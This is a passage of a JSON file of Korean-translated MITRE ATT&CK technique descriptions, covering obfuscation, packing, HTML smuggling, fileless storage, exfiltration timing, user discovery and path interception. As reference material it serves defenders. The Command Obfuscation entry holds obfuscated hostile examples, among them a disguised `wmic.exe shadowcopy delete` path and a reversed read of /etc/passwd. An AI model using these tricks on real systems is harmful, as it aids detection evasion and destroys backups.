      "description": "공격자는 이진 패딩을 사용하여 불필요한 데이터를 추가하고 악성 코드의 디스크 상 표현을 변경할 수 있습니다. 이는 이진 파일의 기능이나 동작에 영향을 미치지 않으면서 수행할 수 있지만, 파일 크기 제한으로 인해 일부 보안 도구가 처리할 수 있는 범위를 넘어 악성 코드의 크기를 증가시킬 수 있습니다.\n\n이진 패딩은 파일의 체크섬을 효과적으로 변경하며, 해시 기반 차단 목록과 정적 안티바이러스 서명을 회피하는 데에도 사용될 수 있습니다.(출처: ESET OceanLotus) 사용되는 패딩은 일반적으로 불필요한 데이터를 생성하는 함수에 의해 생성되어 악성 코드의 끝에 추가되거나 특정 섹션에 적용됩니다.(출처: Securelist Malware Tricks April 2017) 파일 크기를 증가시키면, 대용량 파일을 스캔하도록 설계되거나 구성되지 않은 특정 도구와 탐지 능력의 효과가 감소할 수 있습니다. 이는 또한 분석을 위해 수집될 가능성을 줄일 수 있습니다. VirusTotal과 같은 공공 파일 스캔 서비스는 분석을 위해 업로드할 수 있는 파일의 최대 크기를 제한합니다.(출처: VirusTotal FAQ)",
      "external_id": "T1027.001",
      "modified": "2023-03-30T21:01:53.857Z",
      "title": "Binary Padding",
      "translated": true
    },
    {
      "description": "적대자는 자신의 코드를 숨기기 위해 소프트웨어 패킹 또는 가상 머신 소프트웨어 보호를 수행할 수 있습니다. 소프트웨어 패킹은 실행 파일을 압축하거나 암호화하는 방법입니다. 실행 파일을 패킹하면 파일 서명이 변경되어 서명 기반 탐지를 회피하려고 합니다. 대부분의 압축 해제 기술은 메모리에서 실행 가능한 코드를 압축 해제합니다. 가상 머신 소프트웨어 보호는 실행 가능한 파일의 원래 코드를 오직 특정 가상 머신만 실행할 수 있는 특별한 형식으로 변환합니다. 이후 이 코드를 실행하기 위해 가상 머신이 호출됩니다.(출처: ESET FinFisher 2018년 1월)\n\n소프트웨어 패킹을 수행하는 데 사용되는 유틸리티를 패커라고 합니다. 예시 패커로는 MPRESS와 UPX가 있습니다. 알려진 패커의 보다 포괄적인 목록이 있지만, 적대자는 잘 알려진 패커와 동일한 유물(Files artifacts)을 남기지 않는 자신의 패킹 기술을 만들 수 있어 방어를 회피할 수 있습니다.(출처: Awesome Executable Packing)",
      "external_id": "T1027.002",
      "modified": "2023-03-30T21:01:48.113Z",
      "title": "Software Packing",
      "translated": true
    },
    {
      "description": "공격자는 숨겨진 정보를 탐지당하지 않기 위해 스테가노그래피 기법을 사용할 수 있습니다. 스테가노그래피 기법은 이미지, 오디오 트랙, 비디오 클립 또는 텍스트 파일과 같은 디지털 미디어에 데이터를 숨기는 데 사용될 수 있습니다.\n\n[Duqu](https://attack.mitre.org/software/S0038)는 스테가노그래피를 사용한 초기 악성 코드의 예입니다. 이 악성 코드는 피해자의 시스템에서 수집한 정보를 암호화하고 이를 이미지 안에 숨긴 후, 이미지를 C2 서버로 전송했습니다. (출처: Wikipedia Duqu)\n\n2017년 말경, 한 위협 그룹은 <code>Invoke-PSImage</code>를 사용하여 이미지 파일(.png)에 [PowerShell](https://attack.mitre.org/techniques/T1059/001) 명령을 숨기고 피해자의 시스템에서 코드를 실행했습니다. 이 특정 경우에, [PowerShell](https://attack.mitre.org/techniques/T1059/001) 코드는 피해자의 머신에서 정보를 수집하고 이를 공격자에게 통신하기 위해 또 다른 난독화된 스크립트를 다운로드했습니다. (출처: McAfee Malicious Doc Targets Pyeongchang Olympics)",
      "external_id": "T1027.003",
      "modified": "2023-03-30T21:01:48.815Z",
      "title": "Steganography",
      "translated": true
    },
    {
      "description": "위협 행위자들은 페이로드를 탐지하고 분석하기 어렵게 만들기 위해 피해자에게 파일을 비컴파일 코드 형태로 전달할 수 있습니다. 텍스트 기반의 소스 코드 파일은 실행 파일이나 바이너리를 대상으로 하는 보호 장치의 분석과 검사를 우회할 수 있습니다. 이러한 페이로드는 실행되기 전에 컴파일되어야 하며, 일반적으로 ilasm.exe(Citation: ATTACK IQ), csc.exe 또는 GCC/MinGW와 같은 네이티브 유틸리티를 통해 이루어집니다.(Citation: ClearSky MuddyWater Nov 2018)\n\n소스 코드 페이로드는 또한 암호화, 인코딩되거나, 피싱으로 전달된 다른 파일에 내장될 수 있습니다. 페이로드는 네이티브 OS에 대해 인식할 수 없고 본질적으로 무해한 형식으로 전달될 수도 있으며(예: macOS/Linux의 EXE 파일), 이후 번들된 컴파일러와 실행 프레임워크를 사용하여 적절한 실행 파일 바이너리로 (재)컴파일 될 수 있습니다.(Citation: TrendMicro WindowsAppMac)",
      "external_id": "T1027.004",
      "modified": "2024-10-03T17:43:14.766Z",
      "title": "Compile After Delivery",
      "translated": true
    },
    {
      "description": "적대자는 악의적인 도구가 탐지되었거나 격리되었거나 다른 방식으로 제한되었다고 판단할 경우 도구에서 지표를 제거할 수 있습니다. 그들은 지표를 제거하고 목표의 방어 시스템이나 유사한 시스템을 사용할 수 있는 후속 목표에서 더 이상 탐지되지 않는 업데이트된 버전을 사용하여 도구를 수정할 수 있습니다.\n\n여기서 좋은 예는 악성 소프트웨어가 파일 서명으로 탐지되고 안티바이러스 소프트웨어에 의해 격리되는 경우입니다. 만약 적대자가 악성 소프트웨어가 파일 서명 때문에 격리되었다는 것을 판단할 수 있다면, 그들은 해당 서명을 피하기 위해 파일을 수정하고 그 후 악성 소프트웨어를 다시 사용할 수 있습니다.",
      "external_id": "T1027.005",
      "modified": "2022-04-28T16:07:48.062Z",
      "title": "Indicator Removal from Tools",
      "translated": true
    },
    {
      "description": "공격자들은 악성 페이로드를 일반적인 HTML 파일 내부에 숨겨 콘텐츠 필터를 우회하여 데이터를 밀반입할 수 있습니다. HTML 문서는 원시 바이트를 나타내는 불변 객체인 JavaScript Blob을 저장할 수 있으며, 이는 나중에 파일과 유사한 객체로 구성할 수 있습니다. 데이터는 또한 HTML 문서 내에 미디어 유형 또는 MIME 파일을 삽입할 수 있는 데이터 URL에 저장될 수 있습니다. HTML5는 파일 다운로드를 시작하는 데 사용할 수 있는 다운로드 속성을 도입했습니다. (인용: HTML 밀반입 Menlo Security 2020)(인용: Outflank HTML 밀반입 2018)\n\n공격자들은 JavaScript Blob 및/또는 HTML5 다운로드 속성을 악용하여 보안 제어를 우회하는 페이로드를 피해자에게 전달할 수 있습니다. 웹 콘텐츠 필터와 같은 보안 제어는 HTML/JS 파일 내부에 밀반입된 악성 파일을 식별하지 못할 수 있으며, 콘텐츠는 일반적으로 무해한 MIME 유형(예: <code>text/plain</code> 및/또는 <code>text/html</code>)에 기반하기 때문입니다. 악성 파일이나 데이터는 HTML 파일 내부에서 데이터 URL 및/또는 JavaScript Blob을 통해 난독화되고 숨겨질 수 있으며, 피해자에게 도달했을 때는 다시 난독화 해제될 수 있습니다 (예: [난독화 해제/디코드 파일 또는 정보](https://attack.mitre.org/techniques/T1140)), 잠재적으로 콘텐츠 필터를 우회할 수 있습니다.\n\n예를 들어, JavaScript Blob을 악용하여 피해자 기계에서 동적으로 악성 파일을 생성할 수 있으며, <code>msSaveBlob</code>와 같은 JavaScript 함수를 악용하여 디스크에 파일을 저장할 수도 있습니다. (인용: HTML 밀반입 Menlo Security 2020)(인용: MSTIC NOBELIUM 2021년 5월)(인용: Outflank HTML 밀반입 2018)(인용: nccgroup 밀반입 HTA 2017)",
      "external_id": "T1027.006",
      "modified": "2024-09-12T19:12:13.006Z",
      "title": "HTML Smuggling",
      "translated": true
    },
    {
      "description": "적대자는 맬웨어에서 호출하는 API 함수들을 둔갑시키고 동적으로 해결하여 악성 기능을 숨기고 방어 분석을 저하시킬 수 있습니다. 맬웨어는 일반적으로 프로세스, 파일 및 기타 시스템 아티팩트와 관련된 작업을 수행하기 위해 운영 체제에서 제공하는 다양한 [네이티브 API](https://attack.mitre.org/techniques/T1106) 함수를 사용합니다.\n\n맬웨어에서 호출된 API 함수는 페이로드 파일에 문자열과 같은 정적 아티팩트를 남길 수 있습니다. 방어 분석가는 또한 가져오기 주소 테이블(IAT)이나 동적으로 호출되는 코드와 해당 함수를 제공하는 공유 모듈을 연결하는 데 도움이 되는 기타 구조를 통해 이진 파일이 실행할 가능성이 있는 함수를 발견할 수 있습니다. (참고: Huntress API 해시)(참고: IRED API 해싱)\n\n정적 또는 기타 방어 분석을 피하기 위해 적대자는 동적 API 해결을 사용하여 맬웨어의 특성과 기능을 은폐할 수 있습니다. [소프트웨어 패킹](https://attack.mitre.org/techniques/T1027/002)과 유사하게, 동적 API 해결은 파일 서명을 변경하고 악성 API 함수 호출을 은폐하여 실행할 때까지 해결되고 호출되지 않도록 합니다.\n\nAPI 함수에 대한 맬웨어 호출을 둔갑시키기 위해 다양한 방법이 사용될 수 있습니다. 예를 들어, 함수 이름의 해시는 리터럴 문자열 대신 맬웨어에 일반적으로 저장됩니다. 맬웨어는 이러한 해시(또는 기타 식별자)를 사용하여 `GetProcAddress()` 및 `LoadLibrary()`와 같은 함수를 사용해 연결 및 로딩 프로세스를 수동으로 재현할 수 있습니다. 이러한 해시/식별자는 실행 중에 다양한 형태의 [파일 또는 정보 디코딩/디운된](https://attack.mitre.org/techniques/T1140) 할 때 암호화나 기타 문자열 조작 기술을 사용해 추가적으로 난독화될 수 있습니다. (참고: BlackHat API 패커)(참고: Drakonia HInvoke)(참고: Huntress API 해시)",
      "external_id": "T1027.007",
      "modified": "2022-08-23T18:32:46.899Z",
      "title": "Dynamic API Resolution",
      "translated": true
    },
    {
      "description": "적대자는 페이로드를 분석하기 어렵게 만들기 위해 기호, 문자열 및 기타 사람이 읽을 수 있는 정보를 제거하려고 시도할 수 있습니다. 스크립트와 실행 파일에는 개발자가 코드 기능을 문서화하는 데 도움을 주는 변수 이름과 기타 문자열이 포함될 수 있습니다. 기호는 일반적으로 실행 가능한 페이로드가 컴파일될 때 운영 체제의 `링커`에 의해 생성됩니다. 역공학자는 이러한 기호와 문자열을 사용하여 코드를 분석하고 페이로드의 기능을 식별합니다. (인용: Mandiant golang stripped binaries explanation) (인용: intezer stripped binaries elf files 2018)\n\n적대자는 맬웨어 분석을 더 어렵게 만들기 위해 스트립된 페이로드를 사용할 수 있습니다. 예를 들어, 컴파일러와 기타 도구는 문자열 및 기호를 제거하거나 난독화하는 기능을 제공할 수 있습니다. 적대자는 또한 탐지 및 분석을 피하기 위해 스트립된 페이로드 형식(예: 실행 전용 AppleScript와 같이 컴파일되고 스트립된 버전의 [AppleScript](https://attack.mitre.org/techniques/T1059/002))을 사용한 사례도 있습니다. 사람에게 읽을 수 있는 정보의 부족은 페이로드의 탐지 및 분석을 직접적으로 저해할 수 있습니다. (인용: SentinelLabs reversing run-only applescripts 2021)",
      "external_id": "T1027.008",
      "modified": "2024-04-16T12:26:49.584Z",
      "title": "Stripped Payloads",
      "translated": true
    },
    {
      "description": "공격자는 방어 시스템의 악성 내용 숨기기 위해 다른 파일에 페이로드를 삽입할 수 있습니다. 겉보기에는 무해한 파일(예: 스크립트 및 실행 파일)이 악성 페이로드와 내용을 운반하고 모호하게 만드는 데 악용될 수 있습니다. 어떤 경우에는 삽입된 페이로드가 디지털 서명 및 인증서와 같은 실행 제어에 영향을 미치지 않음으로써 [신뢰 제어를 무력화할 수](https://attack.mitre.org/techniques/T1553) 있습니다.(출처: Sentinel Labs)\n\n공격자는 다양한 파일 형식에 페이로드를 삽입하여 이를 숨길 수 있습니다.(출처: Microsoft Learn) 이는 [스테가노그래피](https://attack.mitre.org/techniques/T1027/003)와 유사하지만, 합법적인 디지털 미디어 형식과 관련된 특정 바이트 및 패턴에 악성 내용을 엮는 것과는 다릅니다.(출처: GitHub PSImage)\n\n예를 들어, 공격자는 무해한 바이너리 내에 또는 그 위에 페이로드를 삽입하는 모습이 관찰되었습니다.(출처: Securelist Dtrack2) 또한 공격자는 같은 형식의 파일 안에 실행 파일 및 실행 전용 스크립트와 같은 페이로드를 중첩시키는 모습도 관찰되었습니다.(출처: SentinelLabs reversing run-only applescripts 2021)\n\n삽입된 콘텐츠는 무해한 시스템 프로세스를 감염시키기 위해 사용되는 [프로세스 주입](https://attack.mitre.org/techniques/T1055) 페이로드로 사용될 수 있습니다.(출처: Trend Micro) 이러한 삽입된 후 주입된 페이로드는 특정 기능(예: 오케스트레이션 모듈을 지원하기 위한 C2 통신 암호화)을 제공하기 위해 설계된 맬웨어의 모듈의 일부로 사용될 수 있습니다. 예를 들어, 기본 브라우저에 삽입된 모듈은 공격자가 네트워크를 통해 통신할 수 있도록 합니다.(출처: Malware Analysis Report ComRAT)",
      "external_id": "T1027.009",
      "modified": "2023-09-29T21:14:57.263Z",
      "title": "Embedded Payloads",
      "translated": true
    },
    {
      "description": "적대자는 탐지를 방해하기 위해 명령 실행 중 콘텐츠를 난독화할 수 있습니다. 명령줄 난독화는 명령 및 스크립트 내의 문자열과 패턴을 서명하고 분석하기 어렵게 만드는 방법입니다. 이러한 유형의 난독화는 제공된 페이로드(예: [피싱](https://attack.mitre.org/techniques/T1566) 및 [드라이브바이 컴프라미즈](https://attack.mitre.org/techniques/T1189))에 의해 실행되는 명령 또는 [명령 및 스크립트 인터프리터](https://attack.mitre.org/techniques/T1059)를 통해 상호작용적으로 포함될 수 있습니다. (인용: Akamai JS)(인용: Malware Monday VBE)\n\n예를 들어, 적대자는 다양한 기호와 이스케이프 문자를 사용하는 구문(예: 공백, `^`, `+`, `$`, `%`)을 악용하여 명령을 분석하기 어렵게 만들면서도 동일한 의도된 기능을 유지할 수 있습니다. (인용: RC PowerShell) 많은 언어에서는 base64 또는 URL 인코딩 형태의 내장 난독화를 지원합니다. (인용: Microsoft PowerShellB64) 적대자는 문자열 분할(`“Wor”+“d.Application”`), 문자 순서 및 대소문자(`rev <<<'dwssap/cte/ tac'`), globing(`mkdir -p '/tmp/:&$NiA'`)과 같은 다양한 트릭을 사용하여 수동으로 명령 난독화를 구현할 수 있으며, 문자열을 토큰/환경 변수/입력 스트림을 통해 전달하는 다양한 트릭도 포함됩니다. (인용: Bashfuscator Command Obfuscators)(인용: FireEye Obfuscation June 2017)\n\n또한, 적대자는 디렉토리 탐색과 같은 트릭을 사용하여 명령에 의해 호출되는 이진 파일에 대한 참조를 난독화할 수 있습니다(`C:\\voi\\pcw\\..\\..\\Windows\\tei\\qs\\k\\..\\..\\..\\system32\\erool\\..\\wbem\\wg\\je\\..\\..\\wmic.exe shadowcopy delete`). (인용: Twitter Richard WMIC)\n\n`Invoke-Obfuscation` 및 `Invoke-DOSfucation`과 같은 도구도 명령을 난독화하는 데 사용되었습니다. (인용: Invoke-DOSfuscation)(인용: Invoke-Obfuscation)",
      "external_id": "T1027.010",
      "modified": "2024-09-12T19:43:18.873Z",
      "title": "Command Obfuscation",
      "translated": true
    },
    {
      "description": "적대적 요소는 방어 시스템에서 악의적인 활동을 숨기기 위해 \"파일 없는\" 형식으로 데이터를 저장할 수 있습니다. 파일 없는 저장은 파일 이외의 모든 형식으로 넓게 정의될 수 있습니다. Windows 시스템에서 일반적인 비휘발성 파일 없는 저장의 예로는 Windows 레지스트리, 이벤트 로그 또는 WMI 저장소가 있습니다. (인용: Microsoft Fileless)(인용: SecureList Fileless) Linux 시스템에서는 `/dev/shm`, `/run/shm`, `/var/run`, `/var/lock`와 같은 공유 메모리 디렉터리도 파일 없는 저장으로 간주될 수 있으며, 이 디렉터리에 쓰인 파일은 디스크에 저장되지 않고 RAM에 직접 매핑됩니다. (인용: Elastic Binary Executed from Shared Memory Directory)(인용: Akami Frog4Shell 2024)(인용: Aquasec Muhstik Malware 2024)\n\n메모리 내에서의 파일 없는 행동인 [반사 코드 로딩](https://attack.mitre.org/techniques/T1620) 및 [프로세스 주입](https://attack.mitre.org/techniques/T1055)과 유사하게, 파일 없는 데이터 저장은 디스크 저장소에서 특정 파일 형식만 접근할 수 있는 안티바이러스 및 기타 엔드포인트 보안 도구에 의해 감지되지 않을 수 있습니다. 파일 없는 저장을 이용하면 적대적 요소가 Linux에서 읽기 전용 파일 시스템이 제공하는 보호 기능을 우회할 수 있습니다. (인용: Sysdig Fileless Malware 23022)\n\n적대적 요소는 파일 없는 저장을 사용하여 저장된 다양한 유형의 데이터를 숨길 수 있으며, 여기에는 페이로드/셸코드 (잠재적으로 [지속성](https://attack.mitre.org/tactics/TA0003)의 일환으로 사용됨)와 피해자로부터 아직 유출되지 않은 수집된 데이터 (예: [로컬 데이터 스테이징](https://attack.mitre.org/techniques/T1074/001))가 포함됩니다. 또한 적대적 요소는 저장할 때 이 파일 없는 데이터를 암호화, 인코딩, 분할 또는 기타 방법으로 난독화하는 경우가 많습니다.\n\n일부 형태의 파일 없는 저장 활동은 간접적으로 파일 시스템에 아티팩트를 생성할 수 있지만, WMI (예: `%SystemRoot%\\System32\\Wbem\\Repository`) 또는 레지스트리 (예: `%SystemRoot%\\System32\\Config`)와 같은 중앙 집중화되고 검사하기 어려운 형식의 물리적 파일에서 생성됩니다. (인용: Microsoft Fileless)",
      "external_id": "T1027.011",
      "modified": "2024-10-04T15:05:25.388Z",
      "title": "Fileless Storage",
      "translated": true
    },
    {
      "description": "공격자는 콘텐츠 필터를 우회하여 악성 페이로드를 다운로드하는 명령을 무해한 것처럼 보이는 윈도우 바로 가기 파일 안에 숨길 수 있습니다. 윈도우 바로 가기 파일(.LNK)은 아이콘 위치 필드(일명 `IconEnvironmentDataBlock`)를 포함하여 여러 메타데이터 필드를 포함하고 있으며, 이는 LNK 파일이 호스트 디렉터리 내에서 표시될 아이콘 파일의 경로를 지정하는 데 사용됩니다.\n\n공격자는 이 LNK 메타데이터를 악용하여 악성 페이로드를 다운로드할 수 있습니다. 예를 들어, 공격자는 LNK 파일을 피싱 페이로드로 사용하여 악성 소프트웨어를 배포하는 사례가 관찰되었습니다. LNK 파일이 호출되면(예: [악성 파일](https://attack.mitre.org/techniques/T1204/002)), LNK 아이콘 위치 필드 내에 있는 외부 URL을 통해 참조된 페이로드가 다운로드될 수 있습니다. 이렇게 다운로드된 파일은 또한 LNK의 대상 경로 필드 내에서 [명령 및 스크립팅 인터프리터](https://attack.mitre.org/techniques/T1059)/[시스템 바이너리 프록시 실행](https://attack.mitre.org/techniques/T1218) 인수에 의해 호출될 수 있습니다.(인용: 바로 가기 보호 해제)(인용: 보비 트랩 바로 가기 2017)\n\nLNK 아이콘 밀수는 또한 감염된 호스트에서 LNK를 실행하는 악성 스크립트를 통해 추가 악성 페이로드를 다운로드하는 등, 침해 후에도 활용될 수 있습니다.",
      "external_id": "T1027.012",
      "modified": "2023-10-17T02:12:05.242Z",
      "title": "LNK Icon Smuggling",
      "translated": true
    },
    {
      "description": "공격자는 탐지를 방해하기 위해 문자열, 바이트 및 기타 특정 패턴을 난독화하기 위해 파일을 암호화하거나 인코딩할 수 있습니다. 파일 콘텐츠를 암호화 및/또는 인코딩하는 목적은 침입에 사용되는 파일 내에서 악성 파일을 숨기는 것입니다. [소프트웨어 패킹](https://attack.mitre.org/techniques/T1027/002), [스테가노그래피](https://attack.mitre.org/techniques/T1027/003), [임베디드 페이로드](https://attack.mitre.org/techniques/T1027/009)와 같은 많은 다른 기술들은 동일한 범위의 목표를 공유합니다. 파일을 암호화 및/또는 인코딩하는 것은 정적 서명의 탐지에서의 누락을 초래할 수 있으며, 이 악성 콘텐츠는 실행/사용 시점에 드러나게 됩니다 (즉, [난독화 해제/디코드 파일 또는 정보](https://attack.mitre.org/techniques/T1140)).\n\n이러한 파일 난독화는 피해자의 호스트에 존재하는 많은 파일 아티팩트에 적용될 수 있으며, 예를 들어 악성 프로그램의 로그/구성 파일 및 페이로드 파일 등에 적용됩니다.(인용: 파일 난독화) 파일은 하드코딩된 키나 사용자가 제공한 키로 암호화될 수 있으며, Base64와 같은 표준 인코딩/압축 방식으로 난독화될 수도 있습니다.\n\n파일의 전체 내용이 난독화될 수 있으며, 특정 함수나 값(예: C2 주소)만 난독화될 수도 있습니다. 추가적인 보호를 위해 암호화와 인코딩은 중복 레이어로 적용될 수 있습니다.\n\n예를 들어 공격자는 비밀번호로 보호된 Word 문서나 자기 추출형(SFX) 아카이브를 사용하여 [피싱](https://attack.mitre.org/techniques/T1566) 페이로드와 같은 파일을 암호화/인코딩하는 방법으로 악용할 수 있습니다. 이러한 파일은 일반적으로 의도된 압축된 내용을 파일이 호출될 때 실행되는 압축 해제기 프로시저에 연결하여 작동합니다 (예: [사용자 실행](https://attack.mitre.org/techniques/T1204)).(인용: SFX - 암호화/인코딩된 파일)\n\n공격자는 파일 특정 및 사용자 정의 인코딩 방식도 악용할 수 있습니다. 예를 들어, 텍스트 파일의 바이트 순서 마크(BOM) 헤더를 악용하여 파일 콘텐츠를 조작하고 난독화하여 [명령 및 스크립팅 인터프리터](https://attack.mitre.org/techniques/T1059) 실행 전까지 숨길 수 있습니다.",
      "external_id": "T1027.013",
      "modified": "2024-10-15T16:32:45.108Z",
      "title": "Encrypted/Encoded File",
      "translated": true
    },
    {
      "description": "적대자는 탐지를 피하기 위해 폴리모픽 코드(변형 코드 또는 변이 코드로도 알려짐)를 사용할 수 있습니다. 폴리모픽 코드는 코드 실행 중 런타임 발자국을 변경할 수 있는 소프트웨어의 일종입니다. 소프트웨어가 실행될 때마다 코드가 원래와 동일한 목적이나 목표를 달성하는 다른 버전으로 변형됩니다. 이 기능은 맬웨어가 안티바이러스 및 안티맬웨어 도구와 같은 전통적인 서명 기반 방어를 회피할 수 있게 해줍니다. \n\n폴리모픽 코드와 함께 사용할 수 있는 다른 난독화 기법도 있습니다. 여기에는 [소프트웨어 패킹](https://attack.mitre.org/techniques/T1027/002), [명령 난독화](https://attack.mitre.org/techniques/T1027/010) 또는 [암호화/인코딩된 파일](https://attack.mitre.org/techniques/T1027/013)와 같은 작업을 수행하기 위해 변형 엔진을 사용하는 것이 포함됩니다.",
      "external_id": "T1027.014",
      "modified": "2024-10-09T18:56:28.092Z",
      "title": "Polymorphic Code",
      "translated": true
    },
    {
      "description": "Windows 원격 관리(WinRM)는 원격 시스템과 상호 작용할 수 있도록 해주는 Windows 서비스이자 프로토콜의 이름입니다(예: 실행 파일 실행, 레지스트리 수정, 서비스 수정). (출처: Microsoft WinRM) 이는 <code>winrm</code> 명령어로 호출되거나 PowerShell과 같은 여러 프로그램을 통해 호출될 수 있습니다. (출처: Jacobsen 2014)",
      "external_id": "T1028",
      "modified": "2020-02-11T18:30:20.937Z",
      "title": "Windows Remote Management",
      "translated": true
    },
    {
      "description": "적대자는 데이터 유출을 특정 시간대나 특정 간격에만 수행하도록 예약할 수 있습니다. 이는 일반적인 활동이나 가용성과의 트래픽 패턴을 혼합하기 위해 이루어질 수 있습니다.\n\n예약된 유출이 사용될 경우, 네트워크 밖으로 정보를 전송하기 위해 다른 유출 기술도 함께 적용될 가능성이 높습니다. 예를 들어, [C2 채널을 통한 유출](https://attack.mitre.org/techniques/T1041) 또는 [대체 프로토콜을 통한 유출](https://attack.mitre.org/techniques/T1048) 등이 있습니다.",
      "external_id": "T1029",
      "modified": "2020-03-28T00:26:48.769Z",
      "title": "Scheduled Transfer",
      "translated": true
    },
    {
      "description": "적대자는 전체 파일 대신 고정 크기의 청크로 데이터를 유출하거나 패킷 크기를 특정 임계값 이하로 제한할 수 있습니다. 이러한 접근 방식은 네트워크 데이터 전송 임계값 경고를 유발하지 않기 위해 사용될 수 있습니다.",
      "external_id": "T1030",
      "modified": "2020-07-14T19:47:46.912Z",
      "title": "Data Transfer Size Limits",
      "translated": true
    },
    {
      "description": "Windows 서비스 구성 정보는 서비스의 실행 파일 또는 복구 프로그램/명령어의 파일 경로를 포함하여 레지스트리에 저장됩니다. 서비스 구성은 sc.exe와 같은 유틸리티 또는 [Reg](https://attack.mitre.org/software/S0075)를 사용하여 수정할 수 있습니다.\n\n적대자는 시스템 유틸리티를 사용하거나 Windows API와 상호 작용하기 위해 사용자 정의 도구를 사용하여 기존 서비스를 수정하여 시스템에 맬웨어를 지속적으로 심을 수 있습니다. 기존 서비스를 사용하는 것은 [위장](https://attack.mitre.org/techniques/T1036)의 일종으로, 따라서 탐지 분석을 더 어렵게 만들 수 있습니다. 기존 서비스를 수정하면 해당 서비스의 기능이 중단되거나 비활성 상태이거나 일반적으로 사용되지 않는 서비스를 활성화할 수 있습니다.\n\n적대자는 악의적인 복구 프로그램/명령어를 실행하기 위해 의도적으로 서비스를 손상시키거나 종료할 수도 있습니다. (출처: Twitter 서비스 복구 2017년 11월) (출처: Microsoft 서비스 복구 2013년 2월)",
      "external_id": "T1031",
      "modified": "2020-03-16T16:05:53.825Z",
      "title": "Modify Existing Service",
      "translated": true
    },
    {
      "description": "적대 세력은 통신 프로토콜이 제공하는 내재적 보호 기능에 의존하기보다는 알려진 암호화 알고리즘을 명시적으로 사용하여 명령 및 제어 트래픽을 숨길 수 있습니다. 보안 알고리즘을 사용하더라도, 이러한 구현은 필요할 경우 비밀 키가 악성 코드 샘플이나 구성 파일 내에서 인코딩되거나 생성될 경우 역공학에 취약할 수 있습니다.",
      "external_id": "T1032",
      "modified": "2020-03-21T00:43:01.387Z",
      "title": "Standard Cryptographic Protocol",
      "translated": true
    },
    {
      "description": "위협 행위자는 주요 사용자, 현재 로그인 중인 사용자, 시스템을 일반적으로 사용하는 사용자 집합 또는 사용자가 시스템을 적극적으로 사용하고 있는지를 파악하려고 할 수 있습니다. 이들은 예를 들어 계정 사용자 이름을 조회하거나 [OS 자격 증명 덤프](https://attack.mitre.org/techniques/T1003)를 사용하여 이 정보를 수집할 수 있습니다. 사용자 및 사용자 이름 정보는 시스템 전반에 걸쳐 널리 퍼져 있으며 실행 중인 프로세스 소유권, 파일/디렉터리 소유권, 세션 정보 및 시스템 로그를 포함하여 여러 가지 다른 발견 기법을 사용하여 수집될 수 있습니다. 위협 행위자는 [시스템 소유자/사용자 발견](https://attack.mitre.org/techniques/T1033)에서 얻은 정보를 자동화된 발견 중에 활용하여 후속 행동을 결정하는 데 사용할 수 있으며, 여기에는 위협 행위자가 목표를 완전히 감염시키거나 특정 행동을 시도하는 여부가 포함됩니다.\n\n다양한 유틸리티와 명령이 이 정보를 수집할 수 있으며, 그 중 하나가 <code>whoami</code>입니다. macOS 및 Linux에서는 현재 로그인 중인 사용자를 <code>w</code> 및 <code>who</code> 명령어를 통해 확인할 수 있습니다. macOS에서는 <code>dscl . list /Users | grep -v '_'</code> 명령어를 사용하여 사용자 계정을 나열할 수도 있습니다. <code>%USERNAME%</code> 및 <code>$USER</code>와 같은 환경 변수를 통해서도 이 정보에 접근할 수 있습니다.\n\n네트워크 장치에서는 [네트워크 장치 CLI](https://attack.mitre.org/techniques/T1059/008) 명령어인 `show users` 및 `show ssh`를 사용하여 현재 장치에 로그인한 사용자를 표시할 수 있습니다. (인용: show_ssh_users_cmd_cisco) (인용: US-CERT TA18-106A 네트워크 인프라 장치 2018)",
      "external_id": "T1033",
      "modified": "2023-09-29T19:50:06.736Z",
      "title": "System Owner/User Discovery",
      "translated": true
    },
    {
      "description": "**이 기술은 더 이상 사용되지 않습니다. 대신 [PATH 환경 변수를 통한 경로 가로채기](https://attack.mitre.org/techniques/T1574/007), [검색 순서 탈취를 통한 경로 가로채기](https://attack.mitre.org/techniques/T1574/008) 및/또는 [인용되지 않은 경로를 통한 경로 가로채기](https://attack.mitre.org/techniques/T1574/009)를 사용하시기 바랍니다.**\n\n경로 가로채기는 실행 파일이 특정 경로에 배치되어, 의도한 대상 대신 애플리케이션에 의해 실행되는 경우 발생합니다. 예를 들어, CreateProcess 함수로 CMD 또는 BAT 파일을 로드하는 취약한 응용 프로그램의 현재 작업 디렉터리에 [cmd](https://attack.mitre.org/software/S0106)의 복사본을 사용하는 것이 있습니다. (출처: TechNet MS14-019)\n\n적들에게 경로 가로채기를 수행할 때 악용할 수 있는 여러 가지 명확한 취약점이나 잘못된 구성 요소가 있습니다: 인용되지 않은 경로, PATH 환경 변수 잘못 구성, 검색 순서 탈취입니다. 첫 번째 취약점은 전체 프로그램 경로와 관련되어 있으며, 두 번째와 세 번째 취약점은 프로그램 경로가 명시되지 않을 때 발생합니다. 이러한 기술은 정기적으로 실행 파일이 호출되는 경우 지속성을 위해 사용될 수 있으며, 가로챈 실행 파일이 더 높은 권한을 가진 프로세스에 의해 시작되는 경우 권한 상승에도 사용할 수 있습니다.\n\n### 인용되지 않은 경로\n서비스 경로(Windows 레지스트리 키에 저장됨) (출처: Microsoft Subkey) 및 바로가기 경로는 경로에 하나 이상의 공백이 포함되고 따옴표로 둘러싸이지 않은 경우 경로 가로채기에 취약합니다 (예: <code>C:\\unsafe path with space\\program.exe</code> vs. <code>\"C:\\safe path with space\\program.exe\"</code>). (출처: Baggett 2012) 공격자는 경로의 상위 디렉터리에 실행 파일을 배치할 수 있으며, Windows는 원하는 실행 파일 대신 해당 실행 파일을 해결합니다. 예를 들어, 바로가기의 경로가 <code>C:\\program files\\myapp.exe</code>인 경우, 공격자는 <code>C:\\program.exe</code>에 프로그램을 생성하여 의도한 프로그램 대신 실행되게 할 수 있습니다. (출처: SecurityBoulevard Unquoted Services APR 2018) (출처: SploitSpren Windows Priv Jan 2018)\n\n### PATH 환경 변수 잘못 구성\nPATH 환경 변수에는 디렉터리 목록이 포함됩니다. 프로그램을 실행하는 특정 방법(즉, cmd.exe 또는 명령줄 사용)은 경로가 주어지지 않았을 때 프로그램을 찾는 위치를 결정하기 위해 PATH 환경 변수에 전적으로 의존합니다. PATH 환경 변수에 Windows 디렉터리 <code>%SystemRoot%\\system32</code> (예: <code>C:\\Windows\\system32</code>) 이전에 어떤 디렉터리가 나열되어 있다면, 해당 디렉터리에서 Windows 프로그램(예: cmd, PowerShell, Python)과 동일한 이름의 프로그램이 배치되어, 해당 명령이 스크립트나 명령줄에서 실행될 때 실행됩니다.\n\n예를 들어, <code>C:\\example path</code>가 PATH 환경 변수에서 <code>C:\\Windows\\system32</code>보다 앞서 있는 경우, <code>C:\\example 